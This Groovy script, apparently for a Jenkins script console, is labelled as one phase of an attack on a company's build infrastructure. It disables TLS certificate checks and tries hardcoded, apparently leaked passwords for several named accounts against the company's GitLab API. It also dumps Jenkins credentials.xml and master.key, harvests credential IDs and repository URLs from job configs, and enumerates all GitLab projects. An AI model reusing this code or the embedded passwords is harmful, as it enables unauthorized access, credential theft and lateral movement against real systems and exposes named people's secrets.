// PHASE 4: HTTPS GitLab + read Jenkins git config for tokens
// Fix: SSL must be set globally using installAllTrusting pattern

import javax.net.ssl.*
import java.security.cert.*

// Install trust-all SSL globally
def tm = [new X509TrustManager() {
    void checkClientTrusted(X509Certificate[] c, String a) {}
    void checkServerTrusted(X509Certificate[] c, String a) {}
    X509Certificate[] getAcceptedIssuers() { return new X509Certificate[0] }
}] as TrustManager[]
def sc = SSLContext.getInstance("TLS")
sc.init(null, tm, new java.security.SecureRandom())
HttpsURLConnection.setDefaultSSLSocketFactory(sc.socketFactory)
HttpsURLConnection.setDefaultHostnameVerifier { host, session -> true }

def get = { url, headers=[:], timeout=10000 ->
    try {
        def conn = new URL(url).openConnection()
        conn.connectTimeout = timeout; conn.readTimeout = timeout + 3000
        conn.setInstanceFollowRedirects(true)
        headers.each { k,v -> conn.setRequestProperty(k, v) }
        def code = conn.responseCode
        def body = ""
        try { body = (code < 400 ? conn.inputStream : conn.errorStream)?.text?:"" } catch(ex) {}
        return [code: code, body: body]
    } catch(e) { return [code: 0, body: "ERR: ${e.message?.take(100)}"] }
}

// ===== PART 1: Try HTTPS GitLab =====
println "=== PART 1: HTTPS GITLAB ==="
def glBase = "https://gitlab.dev.claroshop.com"

def creds = [
    ["jenkins", "e6LBqIkOI\$PR1XX2oia"],
    ["jenkins_legacy", "JenkisLegasy25"],
    ["Jenkins", "JenkisLegasy25"],
    ["maria.policarpo", "FtMRl4fDXzIDY4Yj"],
]

def workingAuth = null
def workingUser = null
def authType = null // "basic" or "token"

// Try Basic auth
creds.each { c ->
    if (workingAuth) return
    def enc = (c[0]+":"+c[1]).bytes.encodeBase64().toString()
    def r = get(glBase + "/api/v4/user", ["Authorization": "Basic ${enc}"])
    println "  Basic ${c[0]}: [${r.code}] ${r.body.take(200)}"
    if (r.code == 200) { workingAuth = enc; workingUser = c[0]; authType = "basic" }
}

// Try PRIVATE-TOKEN
if (!workingAuth) {
    creds.each { c ->
        if (workingAuth) return
        def r = get(glBase + "/api/v4/user", ["PRIVATE-TOKEN": c[1]])
        println "  Token ${c[0]}: [${r.code}] ${r.body.take(100)}"
        if (r.code == 200) { workingAuth = c[1]; workingUser = c[0]; authType = "token" }
    }
}

// ===== PART 2: Read Jenkins Git SCM config for tokens =====
println "\n=== PART 2: JENKINS GIT CONFIG FILES ==="
def gitFiles = [
    "/var/jenkins_home/hudson.plugins.git.GitSCM.xml",
    "/var/jenkins_home/credentials.xml",
    "/var/jenkins_home/secrets/master.key",
]
gitFiles.each { path ->
    def f = new File(path)
    if (f.exists()) {
        println "\n  FILE: ${path}"
        println f.text.take(3000)
    } else {
        println "  NOT FOUND: ${path}"
    }
}

// Check jobs config.xml for GitLab URLs/tokens
println "\n=== PART 3: SCAN JENKINS JOBS FOR GITLAB CREDENTIALS ==="
def jobsDir = new File("/var/jenkins_home/jobs")
if (jobsDir.exists()) {
    def gitUrls = [] as Set
    def tokenRefs = [] as Set
    
    jobsDir.eachFileRecurse { f ->
        if (f.name == "config.xml") {
            def text = f.text
            // Find gitlab URLs
            (text =~ /https?:\/\/[^<"]+gitlab[^<"]+/).each { m -> gitUrls << m }
            (text =~ /172\.27\.[^<"]+\.git/).each { m -> gitUrls << m }
            // Find credential IDs used
            (text =~ /<credentialsId>([^<]+)<\/credentialsId>/).each { m -> tokenRefs << m[1] }
        }
    }
    
    println "  GitLab URLs in jobs:"
    gitUrls.sort().each { println "    ${it}" }
    println "\n  Credential IDs referenced:"
    tokenRefs.sort().each { println "    ${it}" }
}

// ===== PART 4: If auth works, list all projects =====
if (workingAuth) {
    println "\n=== PART 4: LIST ALL PROJECTS (auth=${workingUser}) ==="
    def headers = authType == "basic" ? 
        ["Authorization": "Basic ${workingAuth}"] : 
        ["PRIVATE-TOKEN": workingAuth]
    
    def allProjects = []
    (1..30).each { page ->
        def r = get(glBase + "/api/v4/projects?per_page=100&page=${page}", headers, 15000)
        if (r.code != 200 || r.body.trim() == "[]") return
        
        // Extract id + path_with_namespace
        def matcher = r.body =~ /"id":(\d+)[^{]*?"path_with_namespace":"([^"]+)"/
        def count = 0
        matcher.each { m -> allProjects << [id: m[1], fullpath: m[2]]; count++ }
        if (count == 0) return
    }
    
    println "  TOTAL: ${allProjects.size()}"
    allProjects.sort { it.fullpath }.each { println "  [${it.id}] ${it.fullpath}" }
} else {
    println "\n  NO AUTH WORKING - try sudo/admin endpoints"
    
    // Try GitLab admin via sudo (if we have a valid user + sudo privilege)
    def r = get(glBase + "/api/v4/projects?per_page=20")
    println "  No-auth public projects: [${r.code}] ${r.body.take(300)}"
}

println "\n=== DONE PHASE 4 ==="
